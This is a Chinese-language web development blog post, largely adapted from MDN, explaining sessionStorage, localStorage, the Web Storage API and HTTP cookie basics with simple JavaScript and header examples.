						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%83%b5%e5%b0%b8-cookie-%e5%92%8c%e5%88%a0%e4%b8%8d%e6%8e%89%e7%9a%84-cookie" onclick="onNavClick(`#僵尸-cookie-和删不掉的-cookie-nav`)" id="僵尸-cookie-和删不掉的-cookie-nav">
									僵尸 Cookie 和删不掉的 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%9c%a8%e6%b5%8f%e8%a7%88%e5%99%a8%e4%b8%ad%e5%ad%98%e5%82%a8%e4%bf%a1%e6%81%af%e7%9a%84%e5%85%b6%e4%bb%96%e6%96%b9%e5%bc%8f" onclick="onNavClick(`#在浏览器中存储信息的其他方式-nav`)" id="在浏览器中存储信息的其他方式-nav">
									在浏览器中存储信息的其他方式
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93" onclick="onNavClick(`#总结-nav`)" id="总结-nav">
									总结
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reference" onclick="onNavClick(`#reference-nav`)" id="reference-nav">
									Reference
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav ref="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div ref="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a ref="navTitle" class="navbar-brand" href="https://www.openheart.icu/">
            42th openheart
        </a>
        
        <button type="button" class="nav-darkmode-toggle" v-on:click="toggleDarkMode">
            <i class="material-icons" v-if="isDarkMode">
                brightness_4
            </i>
            <i class="material-icons" v-else="isDarkMode">
                brightness_7
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" ref="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://www.openheart.icu/">
        <div class="single-column-header-title">42th openheart</div>
        
        <div class="single-column-header-subtitle">
            Kris Nie&#39;s Blog.
        </div>
        

    </a>
</div>
            <div id="content">
<div ref="streamContainer" class="stream-container">
    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    SessionStorage &amp; LocalStorage &amp; Cookie
                    
                    <div class="post-subtitle">
                        浏览器缓存
                    </div>
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2020-07-25 11:42
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/technical">Technical</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/operation">Operation</a>
                                &nbsp;
                            
                                <a href="/tags/web">Web</a>
                                &nbsp;
                            
                        
                        
                            <i class="material-icons" style="">schedule</i>
                            

                            
                            

                            
                            44 min
                            
                            22 s.
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <h1 id="windowsessionstorage">Window.sessionStorage</h1>
<p><code>sessionStorage</code> 属性允许你访问一个，对应当前源的 session <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。它与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>localStorage</code></a> 相似，不同之处在于 <code>localStorage</code> 里面存储的数据没有过期时间设置，而存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被清除。</p>
<ul>
<li>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</li>
<li><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文</strong>，这点和 session cookies 的运行方式不同。</li>
<li>打开多个相同的URL的Tabs页面，会创建各自的<code>sessionStorage</code>。</li>
<li>关闭对应浏览器tab，会清除对应的<code>sessionStorage</code>。</li>
</ul>
<blockquote>
<p>应该注意，存储在sessionStorage或localStorage中的数据<strong>特定于页面的协议</strong>。也就是说<code>http://example.com</code> 与 <code>https://example.com</code>的sessionStorage相互隔离。</p>
</blockquote>
<h2 id="语法">语法</h2>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#228b22">// 保存数据到 sessionStorage
</span><span style="color:#228b22"></span>sessionStorage.setItem(<span style="color:#cd5555">&#39;key&#39;</span>, <span style="color:#cd5555">&#39;value&#39;</span>);

<span style="color:#228b22">// 从 sessionStorage 获取数据
</span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">let</span> data = sessionStorage.getItem(<span style="color:#cd5555">&#39;key&#39;</span>);

<span style="color:#228b22">// 从 sessionStorage 删除保存的数据
</span><span style="color:#228b22"></span>sessionStorage.removeItem(<span style="color:#cd5555">&#39;key&#39;</span>);

<span style="color:#228b22">// 从 sessionStorage 删除所有保存的数据
</span><span style="color:#228b22"></span>sessionStorage.clear();
</code></pre></div><h3 id="返回值">返回值</h3>
<p>一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。</p>
<h3 id="示例">示例</h3>
<p>下面的代码访问当前域名的 session <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象，并使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem"><code>Storage.setItem()</code></a> 访问往里面添加一个数据条目。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">sessionStorage.setItem(<span style="color:#cd5555">&#39;myCat&#39;</span>, <span style="color:#cd5555">&#39;Tom&#39;</span>);
</code></pre></div><p>下面的示例会自动保存一个文本输入框的内容，如果浏览器因偶然因素被刷新了，文本输入框里面的内容会被恢复，因此写入的内容不会丢失。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#228b22">// 获取文本输入框
</span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">let</span> field = <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#34;field&#34;</span>);
 
<span style="color:#228b22">// 检测是否存在 autosave 键值
</span><span style="color:#228b22">// (这个会在页面偶然被刷新的情况下存在)
</span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">if</span> (sessionStorage.getItem(<span style="color:#cd5555">&#34;autosave&#34;</span>)) {
  <span style="color:#228b22">// 恢复文本输入框的内容
</span><span style="color:#228b22"></span>  field.value = sessionStorage.getItem(<span style="color:#cd5555">&#34;autosave&#34;</span>);
}
 
<span style="color:#228b22">// 监听文本输入框的 change 事件
</span><span style="color:#228b22"></span>field.addEventListener(<span style="color:#cd5555">&#34;change&#34;</span>, <span style="color:#8b008b;font-weight:bold">function</span>() {
  <span style="color:#228b22">// 保存结果到 sessionStorage 对象中
</span><span style="color:#228b22"></span>  sessionStorage.setItem(<span style="color:#cd5555">&#34;autosave&#34;</span>, field.value);
});
</code></pre></div><h1 id="windowlocalstorage">Window.localStorage</h1>
<p>只读的<code>localStorage</code> 属性允许你访问一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a> 源（origin）的对象 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a>；存储的数据将保存在浏览器会话中。<code>localStorage</code> 类似 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage"><code>sessionStorage</code></a>，但其区别在于：存储在 <code>localStorage</code> 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 <code>sessionStorage</code> 的数据会被清除 。</p>
<p>应注意，无论数据存储在 <code>localStorage</code> 还是 <code>sessionStorage</code> ，<strong>它们都特定于页面的协议。</strong></p>
<p>另外，<code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).</p>
<h2 id="语法-1">语法</h2>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">myStorage = localStorage;
</code></pre></div><h3 id="值">值</h3>
<p>一个可被用于访问当前源（ origin ）的本地存储空间的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。</p>
<h3 id="异常">异常</h3>
<h4 id="securityerror">SecurityError</h4>
<p>请求违反了一个策略声明，或者源（ origin ）不是 <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Definition_of_an_origin">一个有效的 scheme/host/port tuple</a> （例如如果origin使用 <code>file:</code> 或者 <code>data:</code> 形式将可能发生）。比如，用户可以有禁用允许对指定的origin存留数据的浏览器配置。</p>
<p><em>TODO：没大弄明白</em></p>
<h3 id="示例-1">示例</h3>
<p>下面的代码片段访问了当前域名下的本地 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象，并通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem"><code>Storage.setItem()</code></a> 增加了一个数据项目。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">localStorage.setItem(<span style="color:#cd5555">&#39;myCat&#39;</span>, <span style="color:#cd5555">&#39;Tom&#39;</span>);
</code></pre></div><p>该语法用于读取 <code>localStorage</code> 项，如下:</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">let</span> cat = localStorage.getItem(<span style="color:#cd5555">&#39;myCat&#39;</span>);
</code></pre></div><p>该语法用于移除 <code>localStorage</code> 项，如下:</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">localStorage.removeItem(<span style="color:#cd5555">&#39;myCat&#39;</span>);
</code></pre></div><p>该语法用于移除所有的 <code>localStorage</code> 项，如下:</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#228b22">// 移除所有
</span><span style="color:#228b22"></span>localStorage.clear();
</code></pre></div><h1 id="使用-web-storage-api">使用 Web Storage API</h1>
<p>Web Storage API 提供了存储机制，通过该机制，浏览器可以安全地存储键值对，比使用 cookie 更加直观</p>
<h2 id="基本概念">基本概念</h2>
<p>存储对象是简单的键值存储，类似于对象，但是它们在页面加载时保持完整。键和值始终是字符串（请注意，与对象一样，整数键将自动转换为字符串）。您可以像访问对象一样访问这些值，或者使用  <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem"><code>Storage.getItem()</code></a> 和  <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem"><code>Storage.setItem()</code></a> 方法 。这三行都设置了（相同的）colorSetting条目：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">localStorage.colorSetting = <span style="color:#cd5555">&#39;#a4509b&#39;</span>;
localStorage[<span style="color:#cd5555">&#39;colorSetting&#39;</span>] = <span style="color:#cd5555">&#39;#a4509b&#39;</span>;
localStorage.setItem(<span style="color:#cd5555">&#39;colorSetting&#39;</span>, <span style="color:#cd5555">&#39;#a4509b&#39;</span>);
</code></pre></div><p>Web Storage 包含如下两种机制：</p>
<ul>
<li><code>sessionStorage</code> 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。</li>
<li><code>localStorage</code> 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。</li>
</ul>
<p>这两种机制是通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage"><code>Window.sessionStorage</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>Window.localStorage</code></a> 属性使用（更确切的说，在支持的浏览器中 <code>Window</code> 对象实现了 <code>WindowLocalStorage</code>和 <code>WindowSessionStorage</code> 对象并挂在其 <code>localStorage</code> 和 <code>sessionStorage</code> 属性下）—— 调用其中任一对象会创建 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象，通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象，可以设置、获取和移除数据项。对于每个源（origin）<code>sessionStorage</code> 和 <code>localStorage</code> 使用不同的 Storage 对象——独立运行和控制。</p>
<p>例如，在文档中调用 <code>localStorage</code> 将会返回一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象；调用 <code>sessionStorage</code> 返回一个不同的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。可以使用相同的方式操作这些对象，但是操作是独立的。</p>
<h2 id="localstorage-功能检测">localStorage 功能检测</h2>
<p>为了能够使用 localStorage，我们应该首先验证它是否在当前浏览会话中受支持并可用。</p>
<h3 id="测试可用性">测试可用性</h3>
<p>支持 localStorage 的浏览器将在窗口对象上具有一个名为 localStorage 的属性。但是，仅断言该属性存在可能会引发异常。如果 localStorage 确实存在，则仍然不能保证 localStorage 实际可用，因为各种浏览器都提供了禁用 localStorage 的设置。因此，浏览器可能支持localStorage，但不适用于页面上的脚本。</p>
<p>例如，私有浏览模式下的 Safari 浏览器为我们提供了一个空的l ocalStorage 对象，其配额为零，实际上使它无法使用。相反，我们可能会收到合法的 QuotaExceededError，这意味着我们已经用完了所有可用的存储空间，但实际上存储空间可用。我们的功能检测应考虑这些情况。</p>
<p>这是一个检测 localStorage 是否同时受支持和可用的函数：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">function</span> storageAvailable(type) {
    <span style="color:#8b008b;font-weight:bold">var</span> storage;
    <span style="color:#8b008b;font-weight:bold">try</span> {
        storage = <span style="color:#658b00">window</span>[type];
        <span style="color:#8b008b;font-weight:bold">var</span> x = <span style="color:#cd5555">&#39;__storage_test__&#39;</span>;
        storage.setItem(x, x);
        storage.removeItem(x);
        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#8b008b;font-weight:bold">true</span>;
    }
    <span style="color:#8b008b;font-weight:bold">catch</span>(e) {
        <span style="color:#8b008b;font-weight:bold">return</span> e <span style="color:#8b008b;font-weight:bold">instanceof</span> DOMException &amp;&amp; (
            <span style="color:#228b22">// everything except Firefox
</span><span style="color:#228b22"></span>            e.code === <span style="color:#b452cd">22</span> ||
            <span style="color:#228b22">// Firefox
</span><span style="color:#228b22"></span>            e.code === <span style="color:#b452cd">1014</span> ||
            <span style="color:#228b22">// test name field too, because code might not be present
</span><span style="color:#228b22"></span>            <span style="color:#228b22">// everything except Firefox
</span><span style="color:#228b22"></span>            e.name === <span style="color:#cd5555">&#39;QuotaExceededError&#39;</span> ||
            <span style="color:#228b22">// Firefox
</span><span style="color:#228b22"></span>            e.name === <span style="color:#cd5555">&#39;NS_ERROR_DOM_QUOTA_REACHED&#39;</span>) &amp;&amp;
            <span style="color:#228b22">// acknowledge QuotaExceededError only if there&#39;s something already stored
</span><span style="color:#228b22"></span>            (storage &amp;&amp; storage.length !== <span style="color:#b452cd">0</span>);
    }
}
</code></pre></div><p>这是您将如何使用它：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">if</span> (storageAvailable(<span style="color:#cd5555">&#39;localStorage&#39;</span>)) {
  <span style="color:#228b22">// Yippee! We can use localStorage awesomeness
</span><span style="color:#228b22"></span>}
<span style="color:#8b008b;font-weight:bold">else</span> {
  <span style="color:#228b22">// Too bad, no localStorage for us
</span><span style="color:#228b22"></span>}
</code></pre></div><p>您可以通过调用 <code>storageAvailable('sessionStorage')</code> 来测试 sessionStorage。</p>
<p>请参阅此处，<a href="https://gist.github.com/paulirish/5558557">brief history of feature-detecting localStorage</a>.。</p>
<h2 id="一个简单的示例">一个简单的示例</h2>
<p>为了展示 Web Storage 的用法，我们创建了一个简单的示例，假设称为 <strong>Web Storage Demo</strong>。<a href="https://mdn.github.io/dom-examples/web-storage/">示例页面</a>提供了控制表单，用于自定义颜色、字体和装饰图片：</p>
<p><img src="https://mdn.mozillademos.org/files/9685/landing.png" alt="img"></p>
<p>当你选择不同的选项后，页面会立即更新；除此之外，你的选择会被存到 <code>localStorage</code> 里，这样，当你关闭页面之后重新加载时，你的选择会被记住。</p>
<p>我们还提供了一个<a href="https://mdn.github.io/dom-examples/web-storage/event.html">存储事件结果页面</a> — 如果你在另一个标签页加载该页面，然后改变之前示例页面的选项，则随着 <code>StorageEvent</code> 事件的触发，更新的存储信息会显示出来。</p>
<p><img src="https://mdn.mozillademos.org/files/9687/event-output.png" alt="img"></p>
<blockquote>
<p><strong>备注：</strong> 除了使用上面的链接查看示例页面外，还可以<a href="https://github.com/mdn/dom-examples/tree/master/web-storage">获取源码</a>。</p>
</blockquote>
<h3 id="测试本地存储是否已被填充">测试本地存储是否已被填充</h3>
<p>在 <a href="https://github.com/mdn/dom-examples/blob/master/web-storage/main.js">main.js</a> 开头，我们先测试本地存储是否已被填充（即，页面之前被访问过）：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">if</span>(!localStorage.getItem(<span style="color:#cd5555">&#39;bgcolor&#39;</span>)) {
  populateStorage();
} <span style="color:#8b008b;font-weight:bold">else</span> {
  setStyles();
}
</code></pre></div><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem"><code>Storage.getItem()</code></a> 方法用来从存储中获取一个数据项。该例中，我们测试 <code>bgcolor</code> 数据项是否存在。如果不存在，执行 <code>populateStorage()</code> 来将存在的自定义值添加到存储中。如果有值存在，则执行 <code>setStyles()</code> 来使用存储的值更新页面的样式。</p>
<p>**备注：**你还可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/length"><code>Storage.length</code></a> 来测试存储对象是否为空。</p>
<h3 id="从存储中获取值">从存储中获取值</h3>
<p>正如上面提到的，使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem"><code>Storage.getItem()</code></a> 可以从存储中获取一个数据项。该方法接受数据项的键作为参数，并返回数据值。例如：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">function</span> setStyles() {
  <span style="color:#8b008b;font-weight:bold">var</span> currentColor = localStorage.getItem(<span style="color:#cd5555">&#39;bgcolor&#39;</span>);
  <span style="color:#8b008b;font-weight:bold">var</span> currentFont = localStorage.getItem(<span style="color:#cd5555">&#39;font&#39;</span>);
  <span style="color:#8b008b;font-weight:bold">var</span> currentImage = localStorage.getItem(<span style="color:#cd5555">&#39;image&#39;</span>);

  <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;bgcolor&#39;</span>).value = currentColor;
  <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;font&#39;</span>).value = currentFont;
  <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;image&#39;</span>).value = currentImage;

  htmlElem.style.backgroundColor = <span style="color:#cd5555">&#39;#&#39;</span> + currentColor;
  pElem.style.fontFamily = currentFont;
  imgElem.setAttribute(<span style="color:#cd5555">&#39;src&#39;</span>, currentImage);
}
</code></pre></div><p>首先，前三行代码从本地中获取值。接着，将值显示到表单元素中，这样在重新加载页面时与自定义设置保持同步。最后，更新页面的样式和图片，这样重新加载页面后，你的自定义设置重新起作用了。</p>
<h3 id="在存储中设置值">在存储中设置值</h3>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem"><code>Storage.setItem()</code></a> 方法可被用来创建新数据项和更新已存在的值。该方法接受两个参数——要创建/修改的数据项的键，和对应的值。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8b008b;font-weight:bold">function</span> populateStorage() {
  localStorage.setItem(<span style="color:#cd5555">&#39;bgcolor&#39;</span>, <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;bgcolor&#39;</span>).value);
  localStorage.setItem(<span style="color:#cd5555">&#39;font&#39;</span>, <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;font&#39;</span>).value);
  localStorage.setItem(<span style="color:#cd5555">&#39;image&#39;</span>, <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#39;image&#39;</span>).value);

  setStyles();
}
</code></pre></div><p><code>populateStorage()</code> 方法在本地存储中设置三项数据 — 背景颜色、字体和图片路径。然后执行 <code>setStyles()</code> 方法来更新页面的样式。</p>
<p>同时，我们为每个表单元素绑定了一个 <code>onchange</code> 监听器，这样，一个表单值改变时，存储的数据和页面样式会更新。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">bgcolorForm.onchange = populateStorage;
fontForm.onchange = populateStorage;
imageForm.onchange = populateStorage;
</code></pre></div><h3 id="通过-storageevent-响应存储的变化">通过 StorageEvent 响应存储的变化</h3>
<p>无论何时，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象发生变化时（即创建/更新/删除数据项时，重复设置相同的键值不会触发该事件，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear"><code>Storage.clear()</code></a> 方法至多触发一次该事件），<code>StorageEvent</code> 事件会触发。在同一个页面内发生的改变不会起作用——在相同域名下的其他页面（如一个新标签或 iframe）发生的改变才会起作用。在其他域名下的页面不能访问相同的 Storage 对象。</p>
<p>在事件结果页面中的 JavaScript 如下所示（可见 <a href="https://github.com/mdn/dom-examples/blob/master/web-storage/event.js">events.js</a>）：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#658b00">window</span>.addEventListener(<span style="color:#cd5555">&#39;storage&#39;</span>, <span style="color:#8b008b;font-weight:bold">function</span>(e) {  
  <span style="color:#658b00">document</span>.querySelector(<span style="color:#cd5555">&#39;.my-key&#39;</span>).textContent = e.key;
  <span style="color:#658b00">document</span>.querySelector(<span style="color:#cd5555">&#39;.my-old&#39;</span>).textContent = e.oldValue;
  <span style="color:#658b00">document</span>.querySelector(<span style="color:#cd5555">&#39;.my-new&#39;</span>).textContent = e.newValue;
  <span style="color:#658b00">document</span>.querySelector(<span style="color:#cd5555">&#39;.my-url&#39;</span>).textContent = e.url;
  <span style="color:#658b00">document</span>.querySelector(<span style="color:#cd5555">&#39;.my-storage&#39;</span>).textContent = e.storageArea;
});
</code></pre></div><p>这里，我们为 window 对象添加了一个事件监听器，在当前域名相关的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象发生改变时该事件监听器会触发。正如你在上面看到的，此事件相关的事件对象有多个属性包含了有用的信息——改变的数据项的键，改变前的旧值，改变后的新值，改变的存储对象所在的文档的 URL，以及存储对象本身。</p>
<h3 id="删除数据记录">删除数据记录</h3>
<p>Web Storage 提供了一对简单的方法用于移除数据。我们没用在我们的 demo 中使用这些方法，但是添加到你自己的项目中很简单：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/removeItem"><code>Storage.removeItem()</code></a> 接受一个参数——你想要移除的数据项的键，然后会将对应的数据项从域名对应的存储对象中移除。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear"><code>Storage.clear()</code></a> 不接受参数，只是简单地清空域名对应的整个存储对象。</li>
</ul>
<h1 id="http-cookies">HTTP cookies</h1>
<p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">无状态</a>的HTTP协议记录稳定的状态信息成为了可能。</p>
<p>Cookie 主要用于以下三个方面：</p>
<ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API">Web storage API</a> （本地存储和会话存储）或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB</a> 。</p>
<blockquote>
<p>要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用<strong>存储查看</strong>（<a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> ）功能，并在存储树上选中<strong>Cookie</strong>。</p>
</blockquote>
<p><img src="/image/Cookie-20200725121428491.png" alt="image-20200725121428491"></p>
<h2 id="创建cookie">创建Cookie</h2>
<p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 <code>{{HTTPHeader(&quot;Set-Cookie&quot;)}}</code>选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 <code>{{HTTPHeader(&quot;Cookie&quot;)}} </code>请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
<h3 id="set-cookie响应头部和cookie请求头部"><code>Set-Cookie响应头部</code>和<code>Cookie请求头部</code></h3>
<p>服务器使用 <code>{{HTTPHeader(&quot;Set-Cookie&quot;)}} </code>响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：</p>
<pre><code>Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;
</code></pre><p>服务器通过该头部告知客户端保存 Cookie 信息。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
</code></pre></div><p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过{{HTTPHeader(&ldquo;Cookie&rdquo;)}}请求头部再发送给服务器。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre></div><blockquote>
<p><strong>提示:</strong> 如何在以下几种服务端程序中设置 <code>Set-Cookie</code> 响应头信息 :</p>
<ul>
<li><a href="https://secure.php.net/manual/en/function.setcookie.php">PHP</a></li>
<li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value">Node.JS</a></li>
<li><a href="https://docs.python.org/3/library/http.cookies.html">Python</a></li>
<li><a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a></li>
</ul>
</blockquote>
<h3 id="定义-cookie-的生命周期">定义 Cookie 的生命周期</h3>
<p>Cookie 的生命周期可以通过两种方式定义：</p>
<ul>
<li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</li>
<li>持久性 Cookie 的生命周期取决于过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）指定的一段时间。</li>
</ul>
<p>例如：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre></div><p><strong>提示</strong>：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
<p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation">会话固定攻击（session fixation attacks）</a>，在该攻击中第三方可以重用用户的会话。</p>
